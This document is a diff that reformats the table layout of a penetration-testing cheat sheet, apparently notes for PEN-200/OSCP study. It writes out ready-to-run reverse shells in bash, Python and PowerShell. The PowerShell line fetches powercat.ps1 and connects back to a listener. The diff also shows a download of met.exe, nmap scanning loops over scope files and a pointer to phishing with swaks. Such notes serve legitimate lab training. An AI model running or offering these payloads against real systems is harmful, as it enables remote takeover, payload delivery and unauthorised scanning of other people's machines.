@@ -1,9 +1,9 @@
-| **Reverse shells** | **Description** |
-| ---- | ---- |
-| `bash -i >& /dev/tcp/192.168.119.3/4444 0>&1` | Common reverse shell |
-| `bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"` | If prior shell doesn't work due to Bourne Shell |
-| `python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("192.168.45.190",9001));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'` | Python reverse shell |
-| `IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.190/powercat.ps1');powercat -c 192.168.119.2 -p 4444 -e powershell` | Powershell reverse shell with PowerCat |
+| **Reverse shells**                                                                                                                                     | **Description**                                 |
+| ------------------------------------------------------------------------------------------------------------------------------------------------------ | ----------------------------------------------- |
+| `bash -i >& /dev/tcp/192.168.119.3/4444 0>&1`                                                                                                          | Common reverse shell                            |
+| `bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"`                                                                                                | If prior shell doesn't work due to Bourne Shell |
+| `python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("192.168.45.190",9001));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'` | Python reverse shell                            |
+| `IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.190/powercat.ps1');powercat -c 192.168.119.2 -p 4444 -e powershell`            | Powershell reverse shell with PowerCat          |
 
 | **Netcat listener** | **Description** |
 | ---- | ---- |
@@ -72,9 +72,9 @@ Retrieve a file in Powershell (same as wget)
 iwr -uri http://192.168.119.2/met.exe -Outfile met.exe
 ```
 
-| Enumerating | **Description** |
-| ---- | ---- |
-| `for i in $(cat ../internal-network.txt); do mkdir -p $i/nmap; nmap -p- --min-rate=10000 --open $i -oA "$i/nmap/quick-scan"; done` | Quick scan from scope file |
+| Enumerating                                                                                                                                                                                                                                                                                                 | **Description**                  |
+| ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------- |
+| `for i in $(cat ../internal-network.txt); do mkdir -p $i/nmap; nmap -p- --min-rate=10000 --open $i -oA "$i/nmap/quick-scan"; done`                                                                                                                                                                          | Quick scan from scope file       |
 | `mkdir nmap`<br>`for i in $(cat scope.txt); do sudo nmap -p- --min-rate=10000 --open $i -oG nmap/$i; done`<br>`cd nmap`<br>`for i in $(ls \| grep -v '.nmap'); do extractPorts $i; export clipboard_content=`xclip -o -selection clipboard`; nmap -p $clipboard_content -sCV -A -T4 $i -oN "$i.nmap"; done` | Script to process scope.txt file |
 
 **Phising:** Refer to PEN-200 content, 24.3.2 module and use swaks
